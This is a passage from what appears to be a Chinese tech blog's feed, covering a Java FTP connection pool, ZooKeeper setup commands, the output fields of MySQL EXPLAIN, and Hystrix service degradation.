id="FtpClientFactory"><a href="#FtpClientFactory" class="headerlink" title="FtpClientFactory"></a>FtpClientFactory</h4><p>FtpClientFactory 继承 org.apache.commons.pool2 包下的BasePooledObjectFactory抽象类。</p><p>重写其抽象方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/**     </span></span><br><span class="line"><span class="comment">    * create创建连接放入连接池    </span></span><br><span class="line"><span class="comment">    *   </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> T <span class="title">create</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**     </span></span><br><span class="line"><span class="comment">    * Wrap the provided instance with an implementation of PooledObject     </span></span><br><span class="line"><span class="comment">    * 对实际存储的对象T，使用PooledObject进行包装，以便于ObjectPool管理     </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> PooledObject&lt;T&gt; <span class="title">wrap</span><span class="params">(T var1)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> FTPClient <span class="title">create</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">FTPClient client = <span class="keyword">new</span> FTPClient();</span><br><span class="line"><span class="keyword">boolean</span> hasError = <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">client.setDefaultPort(config.getPort());</span><br><span class="line">client.setConnectTimeout(config.getConnectTimeout());</span><br><span class="line">client.setDataTimeout(config.getDataTimeout());</span><br><span class="line">client.setDefaultTimeout(config.getSocketTimeout());</span><br><span class="line">client.connect(config.getHost(), config.getPort());</span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> startTime = System.currentTimeMillis();</span><br><span class="line"><span class="keyword">if</span> (!client.login(config.getUsername(), config.getPassword())) &#123;</span><br><span class="line">hasError = <span class="keyword">true</span>;</span><br><span class="line">String replyStr = client.getReplyString();</span><br><span class="line">client.logout();</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> FtpClientCreateException(<span class="string">"登录FTP失败！"</span> + replyStr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//检测登录是否成功</span></span><br><span class="line"><span class="keyword">if</span> (!FTPReply.isPositiveCompletion(client.getReplyCode())) &#123;</span><br><span class="line">hasError = <span class="keyword">true</span>;</span><br><span class="line">String replyStr = client.getReplyString();</span><br><span class="line">client.disconnect();</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> FtpClientCreateException(<span class="string">"FTP拒绝连接!"</span> + replyStr);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">client.setFileType(FTP.BINARY_FILE_TYPE);</span><br><span class="line">client.enterLocalPassiveMode();</span><br><span class="line">client.setBufferSize(config.getBufferSize());</span><br><span class="line">logger.info(<span class="string">"ftp【&#123;&#125;】链接创建成功，用时：&#123;&#125;毫秒"</span>, config.getHost(),</span><br><span class="line">(System.currentTimeMillis() - startTime));</span><br><span class="line"><span class="keyword">return</span> client;</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"><span class="comment">// 如果发生异常，关闭已经创建的连接</span></span><br><span class="line"><span class="keyword">if</span> (hasError) &#123;</span><br><span class="line">closeCon(client);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> PooledObject&lt;FTPClient&gt; <span class="title">wrap</span><span class="params">(FTPClient ftpClient)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> DefaultPooledObject&lt;&gt;(ftpClient);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其他方法如下，可根据业务需要修改。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 销毁连接</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroyObject</span><span class="params">(PooledObject&lt;FTPClient&gt; p)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 验证连接（FtpConfig中若开启testonborrow、testonreturn配置后进入该方法校验）    </span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">validateObject</span><span class="params">(PooledObject&lt;FTPClient&gt; p)</span></span></span><br></pre></td></tr></table></figure><h4 id="FtpClientPool"><a href="#FtpClientPool" class="headerlink" title="FtpClientPool"></a>FtpClientPool</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FtpClientPool</span> <span class="keyword">extends</span> <span class="title">GenericObjectPool</span>&lt;<span class="title">FTPClient</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">FtpClientPool</span><span class="params">(PooledObjectFactory&lt;FTPClient&gt; factory)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">super</span>(factory);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">FtpClientPool</span><span class="params">(PooledObjectFactory&lt;FTPClient&gt; factory, GenericObjectPoolConfig config)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">super</span>(factory, config);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">returnObject</span><span class="params">(FTPClient obj)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (obj != <span class="keyword">null</span>) &#123;</span><br><span class="line">         <span class="keyword">super</span>.returnObject(obj);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="FtpConfig"><a href="#FtpConfig" class="headerlink" title="FtpConfig"></a>FtpConfig</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConfigurationProperties</span>(prefix = <span class="string">"ftp"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FtpConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ftp地址</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String host;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ftp端口</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> port;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ftp用户名</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ftp密码</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String password;    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//.......</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 连接池</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@PostConstruct</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ftpClientPool</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 初始化连接池</span></span><br><span class="line">        GenericObjectPoolConfig config = <span class="keyword">new</span> GenericObjectPoolConfig();</span><br><span class="line">        config.setTestOnBorrow(<span class="keyword">true</span>);</span><br><span class="line">        config.setTestWhileIdle(<span class="keyword">true</span>);</span><br><span class="line">        config.setMaxTotal(<span class="keyword">this</span>.poolMaxActive);</span><br><span class="line">        config.setMaxIdle(<span class="keyword">this</span>.poolMaxIdle);</span><br><span class="line">        config.setMinIdle(<span class="keyword">this</span>.poolMinIdle);</span><br><span class="line">        config.setMaxWaitMillis(<span class="keyword">this</span>.poolMaxWait);</span><br><span class="line">        config.setTimeBetweenEvictionRunsMillis(<span class="keyword">this</span>.checkIdleTime);</span><br><span class="line">        FtpClientPool ftpClientPool = <span class="keyword">new</span> FtpClientPool(</span><br><span class="line">                <span class="keyword">new</span> FtpClientFactory(<span class="keyword">this</span>), config);</span><br><span class="line">        FtpUtil.initPool(ftpClientPool);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ftp连接池 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Zookeeper简介</title>
      <link href="/2021/06/13/Zookeeper%E7%AE%80%E4%BB%8B/"/>
      <url>/2021/06/13/Zookeeper%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Zookeeper 是一个开源的分布式的，为分布式框架提供协调服务的 Apache 项目。</p><h2 id="工作机制"><a href="#工作机制" class="headerlink" title="工作机制"></a>工作机制</h2><p>Zookeeper从设计模式角度来理解：是一个基 于观察者模式设计的分布式服务管理框架，它负 责 存储和管理大家都关心的数据，然 后接受观察者的 注 册，一旦这些数据的状态发生变化，Zookeeper 就 将负责通知已经在Zookeeper上注册的那些观察 者做出相应的反应。</p><p><img src="/img/zookeeper/zookeeper.png" alt=""></p><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p><img src="/img/zookeeper/zookeeper1.png" alt=""></p><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><p>ZooKeeper 数据模型的结构与 Unix 文件系统很类似，整体上可以看作是一棵树，每个 节点称做一个 ZNode。每一个 ZNode 默认能够存储 1MB 的数据，每个 ZNode 都可以通过 其路径唯一标识。</p><p><img src="/img/zookeeper/zookeeper2.png" alt=""></p><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>提供的服务包括：统一命名服务、统一配置管理、统一集群管理、服务器节点动态上下线、软负载均衡等。</p><p><img src="/img/zookeeper/zookeeper4.png" alt=""></p><p><img src="/img/zookeeper/zookeeper5.png" alt=""></p><p><img src="/img/zookeeper/zookeeper6.png" alt=""></p><h2 id="zookeeper安装"><a href="#zookeeper安装" class="headerlink" title="zookeeper安装"></a>zookeeper安装</h2><h3 id="1-1-下载安装"><a href="#1-1-下载安装" class="headerlink" title="1.1 下载安装"></a>1.1 下载安装</h3><p><strong>1、环境准备</strong></p><p>ZooKeeper服务器是用Java创建的，它运行在JVM之上。需要安装JDK 7或更高版本。</p><p><strong>2、上传</strong></p><p>将下载的ZooKeeper放到/opt/ZooKeeper目录下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">上传zookeeper alt+p</span></span><br><span class="line">put f:/setup/apache-zookeeper-3.5.6-bin.tar.gz</span><br><span class="line"><span class="meta">#</span><span class="bash">打开 opt目录</span></span><br><span class="line">cd /opt</span><br><span class="line"><span class="meta">#</span><span class="bash">创建zooKeeper目录</span></span><br><span class="line">mkdir  zooKeeper</span><br><span class="line"><span class="meta">#</span><span class="bash">将zookeeper安装包移动到 /opt/zooKeeper</span></span><br><span class="line">mv apache-zookeeper-3.5.6-bin.tar.gz /opt/zookeeper/</span><br></pre></td></tr></table></figure><p><strong>3、解压</strong></p><p>将tar包解压到/opt/zookeeper目录下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf apache-ZooKeeper-3.5.6-bin.tar.gz</span><br></pre></td></tr></table></figure><h3 id="1-2-配置启动"><a href="#1-2-配置启动" class="headerlink" title="1.2 配置启动"></a>1.2 配置启动</h3><p><strong>1、配置zoo.cfg</strong></p><p>进入到conf目录拷贝一个zoo_sample.cfg并完成配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">进入到conf目录</span></span><br><span class="line">cd /opt/zooKeeper/apache-zooKeeper-3.5.6-bin/conf/</span><br><span class="line"><span class="meta">#</span><span class="bash">拷贝</span></span><br><span class="line">cp  zoo_sample.cfg  zoo.cfg</span><br></pre></td></tr></table></figure><p>修改zoo.cfg</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">打开目录</span></span><br><span class="line">cd /opt/zooKeeper/</span><br><span class="line"><span class="meta">#</span><span class="bash">创建zooKeeper存储目录</span></span><br><span class="line">mkdir  zkdata</span><br><span class="line"><span class="meta">#</span><span class="bash">修改zoo.cfg</span></span><br><span class="line">vim /opt/zooKeeper/apache-zooKeeper-3.5.6-bin/conf/zoo.cfg</span><br></pre></td></tr></table></figure><p><img src="/img/zookeeper/zookeeper7.png" alt=""></p><p>修改存储目录：dataDir=/opt/zookeeper/zkdata</p><p><strong>2、启动ZooKeeper</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/zooKeeper/apache-zooKeeper-3.5.6-bin/bin/</span><br><span class="line"><span class="meta">#</span><span class="bash">启动</span></span><br><span class="line"> ./zkServer.sh  start</span><br></pre></td></tr></table></figure><p><img src="/img/zookeeper/zookeeper8.png" alt=""></p><p>看到上图表示ZooKeeper成功启动</p><p><strong>3、查看ZooKeeper状态</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./zkServer.sh status</span><br></pre></td></tr></table></figure><p>zookeeper启动成功。standalone代表zk没有搭建集群，现在是单节点</p><p><img src="/img/zookeeper/zookeeper9.png" alt=""></p><p>zookeeper没有启动</p><p><img src="/img/zookeeper/zookeeper10.png" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> Zookeeper </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql执行计划</title>
      <link href="/2021/06/07/Mysql%E6%89%A7%E8%A1%8C%E8%AE%A1%E5%88%92/"/>
      <url>/2021/06/07/Mysql%E6%89%A7%E8%A1%8C%E8%AE%A1%E5%88%92/</url>
      
        <content type="html"><![CDATA[<h2 id="Mysql-执行计划"><a href="#Mysql-执行计划" class="headerlink" title="Mysql 执行计划"></a>Mysql 执行计划</h2><p>当客户端发送给mysql 服务器一条查询语句后，经过sql的优化器，会产生一个执行计划。</p><h3 id="执行计划"><a href="#执行计划" class="headerlink" title="执行计划"></a>执行计划</h3><p>使用 EXPLAIN 关键字可以模拟优化器执行 SQL 查询语句，从而知道 MYSQL 是如何处理你的 sql 语句的。分析你的查询语句或是表结构的性能瓶颈。</p><p>语法: Explain + sql</p><h3 id="执行计划的作用"><a href="#执行计划的作用" class="headerlink" title="执行计划的作用"></a>执行计划的作用</h3><p>分析sql语句中</p><ul><li>表的读取顺序</li><li>数据读取操作的操作类型</li><li>哪些索引可以使用</li><li>哪些索引被实际使用</li><li>表之间的引用</li><li>每张表有多少行被优化器查</li></ul><h3 id="执行计划包含的信息"><a href="#执行计划包含的信息" class="headerlink" title="执行计划包含的信息"></a>执行计划包含的信息</h3><p><img src="/img/sql/Mysql执行计划.png" alt=""></p><p><strong>id:获取 select 子句的操作表顺序，有几种情况</strong></p><ul><li>id相同的情况下执行顺序是由上到下。</li><li>id 越大 优先级越高，如果是子查询，ID 序列号会递增，id值越大，优先级越高，越先执行。</li><li>id 相同又有不相同的，序列号大的会先执行，然后相同的从上到下执行。</li></ul><p><strong>select_type:查询的类别，主要用于区别普通查询，联合查询，子查询等的复杂查询。</strong><br>simple : 简单的select 查询，不包含子查询或者 union<br>primary : 查询中包含任何复杂的子部分，最外层查询则被标记<br>subquery : 在 select 或者 where 列表中包含了子查询<br>derived : 在from 列表中包含子查询被标记为 derived Mysql 会递归执行这些子查询，把结果放到临时表里<br>union : 若在第二个 select 中出现 union之后，则被标记为 union 若union包含在 from 子句的子查询中，外层 select 将被标记为 derived<br>union result : 从 union 表获取结果的 SELECT</p><p><strong>table：显示这一行的数据是关于那个表的</strong></p><p><strong>type:显示的是访问类型，是较为重要的一个指标，结果值从最好到最坏依次是：</strong><br>system &gt; const &gt; eq_ref &gt; ref &gt; fulltext &gt; ref_or_null &gt; index_merge &gt; unique_subquery &gt; index_subquery&gt; range &gt; index&gt;all</p><p>需要记住的：system &gt; const &gt; eq_ref &gt; ref &gt; range &gt; index&gt;all 基本需要达到 ref range 级别。</p><div class="table-container"><table><thead><tr><th style="text-align:center">type</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">ALL</td><td style="text-align:center">全数据表扫描</td></tr><tr><td style="text-align:center">index</td><td style="text-align:center">全索引表扫描</td></tr><tr><td style="text-align:center">RANGE</td><td style="text-align:center">对索引列进行范围查找</td></tr><tr><td style="text-align:center">INDEX_MERGE</td><td style="text-align:center">合并索引，使用多个单列索引搜索</td></tr><tr><td style="text-align:center">REF</td><td style="text-align:center">根据索引查找一个或多个值</td></tr><tr><td style="text-align:center">EQ_REF</td><td style="text-align:center">搜索时使用primary key 或 unique类型</td></tr><tr><td style="text-align:center">CONST</td><td style="text-align:center">常量，表最多有一个匹配行,因为仅有一行,在这行的列值可被优化器剩余部分认为是常数,const表很快,因为它们只读取一次。</td></tr><tr><td style="text-align:center">SYSTEM</td><td style="text-align:center">系统，表仅有一行(=系统表)。这是const联接类型的一个特例。</td></tr><tr><td style="text-align:center">性能：<code>all</code> &lt; <code>index</code> &lt; <code>range</code> &lt; <code>index_merge</code> &lt; <code>ref_or_null</code> &lt; <code>ref</code> &lt; <code>eq_ref</code> &lt; <code>system/const</code></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">性能在 range 之下基本都可以进行调优</td></tr></tbody></table></div><p>system : 表中只有一行记录（等于系统表），这是const 类型的特列，平时不会出现，这个可以忽略不计。</p><p>const : 表示通过索引一次就找到了，const 用于比较 primary key 或者 unqiue 索引，因为只匹配一条数据，所以很快，如将主键置于 where 条件中，Mysql 就能将该查询转换一个常量。</p><p>eq_ref : 唯一性索引扫描，对于每个索引键，表中只有一条记录与之匹配，常见与主键或唯一索引扫描</p><p>ref : 非唯一索引扫描，返回匹配某个单独值的所有行</p><p>range: 只检索给定范围的行，使用一个索引来选择行，key列显示使用了哪个索引，一般就是在你的 where 语句中出现了 between ,&lt;,&gt;,in 等查询这种范围扫描比全表扫描要好，因为它只需要开始与索引的某一点，而结束与另一点，不用扫描全部索引。</p><p>index : 当查询的结果全为索引列的时候。</p><p>all : Full Table Scan 将遍历全表以找到匹配的行。</p><p><strong>possible_keys</strong> : 可能使用的索引</p><p><strong>key :实际上使用的索引，如果没用索引，则为NULL，查询中若使用了覆盖索引，则该索引和查询的select 字段重叠。</strong></p><p><strong>key len ：</strong><br>表示索引中使用的字节数，可通过该列计算查询中使用的字节长度，在不损失精确的情况下，长度越短越好。<br>key_len 显示的值为索引字段的最大可能长度，并非实际使用长度，即key_len 是根据表定义计算而得，不是通过表内检索出的<br>key_len 表示索引使用的字节数<br>根据这个值，就可以判断索引使用情况，特别是在组合索引的时候，判断所有的索引字段是否都被查询用到。<br>char 和 varchar 跟字符编码也有密切的联系。(latin1 占用一个字节，gbk 占用两个字节，utf-8 占用三个字节)</p><p>总结 ：</p><p>整数/浮点数/时间类型的索引长度 NOT NULL = 字段本身的长度 NULL = 字段本身的字段长度+1（因为需要是否为空的标记，这个标记占一个字节）.</p><p>datatime 类型 在5.6中占5个字节，在5.5中占8个字节。</p><p>变长字段需要额外两个字节(varchar 值保存时只保存需要的字符数另外加一个字节来记录长度，如果列声明的长度超过255，则使用两个字节，所以varchar 索引长度计算时候要加2)，固定长度字段不需要额外的字节。</p><p>而 NULL 都需要1个字节的额外空间，所以索引字段最好不要为 NULL，因为 NULL 让统计更加复杂并且需要额外的存储空间。</p><p>复合索引有最左前缀的特性，如果复合索引能全部用上，则是复合索引字段的索引长度之和，这也可以用来判定复合索引是否部分使用，还是全部使用。</p><p><strong>rows</strong> : mysql 预估为了找到所需的行而要读取的行数</p><div class="table-container"><table><thead><tr><th style="text-align:center">extra</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">Using filesort</td><td style="text-align:center">此值表示mysql将使用覆盖索引，以避免访问表。</td></tr><tr><td style="text-align:center">Using temporary</td><td style="text-align:center">mysql 将在存储引擎检索行后再进行过滤，许多where条件里涉及索引中的列，当(并且如果)它读取索引时，就能被存储引擎检验，因此不是所有带where子句的查询都会显示“Using where”。有时“Using where”的出现就是一个暗示：查询可受益于不同的索引。</td></tr><tr><td style="text-align:center">Using index</td><td style="text-align:center">mysql 对查询结果排序时会使用临时表。</td></tr><tr><td style="text-align:center">Using where</td><td style="text-align:center">mysql会对结果使用一个外部索引排序，而不是按索引次序从表里读取行。mysql有两种文件排序算法，这两种排序方式都可以在内存或者磁盘上完成，explain不会告诉你mysql将使用哪一种文件排序，也不会告诉你排序会在内存里还是磁盘上完成。</td></tr><tr><td style="text-align:center">Using join buffer</td><td style="text-align:center">没有好用的索引，新的索引将在联接的每一行上重新估算，N是显示在possible_keys列中索引的位图，并且是冗余的</td></tr><tr><td style="text-align:center">Impossible where</td><td style="text-align:center">where 子句总是 false们不能用来获取</td></tr></tbody></table></div>]]></content>
      
      
      
        <tags>
            
            <tag> Mysql </tag>
            
            <tag> 执行计划 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hystrix服务降级</title>
      <link href="/2021/05/30/Hystrix%E6%9C%8D%E5%8A%A1%E9%99%8D%E7%BA%A7/"/>
      <url>/2021/05/30/Hystrix%E6%9C%8D%E5%8A%A1%E9%99%8D%E7%BA%A7/</url>
      
        <content type="html"><![CDATA[<h2 id="Hystrix服务降级"><a href="#Hystrix服务降级" class="headerlink" title="Hystrix服务降级"></a>Hystrix服务降级</h2><p><img src="/img/springcloud2020/Hystrix的2.png" alt=""></p><p><img src="/img/springcloud2020/Hystrix的3.png" alt=""></p><p><img src="/img/springcloud2020/Hystrix的4.png" alt=""></p><h3 id="hystrix中的重要概念"><a href="#hystrix中的重要概念" class="headerlink" title="hystrix中的重要概念:"></a>hystrix中的重要概念:</h3><h4 id="1-服务降级"><a href="#1-服务降级" class="headerlink" title="1,服务降级"></a>1,服务降级</h4><p><strong>比如当某个服务繁忙,不能让客户端的请求一直等待,应该立刻返回给客户端一个备选方案</strong></p><h4 id="2-服务熔断"><a href="#2-服务熔断" class="headerlink" title="2,服务熔断"></a>2,服务熔断</h4><p><strong>当某个服务出现问题,卡死了服务不可用了,不能让用户一直等待,需要关闭所有对此服务的访问（保险丝熔断电路跳闸）然后调用服务降级</strong></p><h4 id="3-服务限流"><a href="#3-服务限流" class="headerlink" title="3,服务限流"></a>3,服务限流</h4><p><strong>限流,比如秒杀场景,不能访问用户瞬间都访问服务器,限制一次只可以有多少请求</strong></p><h3 id="使用hystrix-服务降级"><a href="#使用hystrix-服务降级" class="headerlink" title="使用hystrix,服务降级:"></a>使用hystrix,服务降级:</h3><h4 id="1-创建带降级机制的pay模块"><a href="#1-创建带降级机制的pay模块" class="headerlink" title="1,创建带降级机制的pay模块 :"></a>1,创建带降级机制的pay模块 :</h4><p>名字: cloud-hystrix-pay-8007</p><h5 id="2-pom文件"><a href="#2-pom文件" class="headerlink" title="2,pom文件"></a>2,pom文件</h5><h5 id="3-配置文件"><a href="#3-配置文件" class="headerlink" title="3,配置文件"></a>3,配置文件</h5><p><img src="/img/springcloud2020/Hystrix的5.png" alt=""></p><p>4,主启动类</p><p><img src="/img/springcloud2020/Hystrix的8.png" alt=""></p><p>5,service</p><p><img src=".\图片\Hystrix的6.png" alt=""></p><p>6controller</p><p><img src=".\图片\Hystrix的7.png" alt=""></p><p>7,先测试:</p><p>此时使用压测工具（如JMeter）,并发20000个请求,请求会延迟的那个方法,<br>        压测中,发现,另外一个方法并没有被压测,但是我们访问它时,却需要等待<br>        这就是因为被压测的方法它占用了服务器大部分资源,导致其他请求也变慢了</p><h5 id="8-先不加入hystrix"><a href="#8-先不加入hystrix" class="headerlink" title="8,先不加入hystrix,"></a>8,先不加入hystrix,</h5><h4 id="2-创建带降级的order模块"><a href="#2-创建带降级的order模块" class="headerlink" title="2,创建带降级的order模块:"></a>2,创建带降级的order模块:</h4><h5 id="1-名字-cloud-hystrix-order-80"><a href="#1-名字-cloud-hystrix-order-80" class="headerlink" title="1,名字:  cloud-hystrix-order-80"></a>1,名字:  cloud-hystrix-order-80</h5><h5 id="2-pom"><a href="#2-pom" class="headerlink" title="2,pom"></a>2,pom</h5><h5 id="3-配置文件-1"><a href="#3-配置文件-1" class="headerlink" title="3,配置文件"></a>3,配置文件</h5><p><img src="/img/springcloud2020/Hystrix的9.png" alt=""></p><h5 id="4-主启动类"><a href="#4-主启动类" class="headerlink" title="4,主启动类"></a>4,主启动类</h5><p><img src="/img/springcloud2020/Hystrix的11.png" alt=""></p><h5 id="5-远程调用pay模块的接口"><a href="#5-远程调用pay模块的接口" class="headerlink" title="5,远程调用pay模块的接口:"></a>5,远程调用pay模块的接口:</h5><p><img src="/img/springcloud2020/Hystrix的12.png" alt=""></p><h5 id="6-controller"><a href="#6-controller" class="headerlink" title="6,controller:"></a>6,controller:</h5><p><img src="/img/springcloud2020/Hystrix的13.png" alt=""></p><h5 id="7-测试"><a href="#7-测试" class="headerlink" title="7,测试"></a>7,测试</h5><p> 启动order模块,访问pay</p><p> 再次压测2万并发,发现order访问也变慢了</p><p><img src="/img/springcloud2020/Hystrix的14.png" alt=""></p><p><strong>解决:</strong></p><p><img src="/img/springcloud2020/Hystrix的15.png" alt=""></p><p><img src="/img/springcloud2020/Hystrix的16.png" alt=""></p><h4 id="3-配置服务降级"><a href="#3-配置服务降级" class="headerlink" 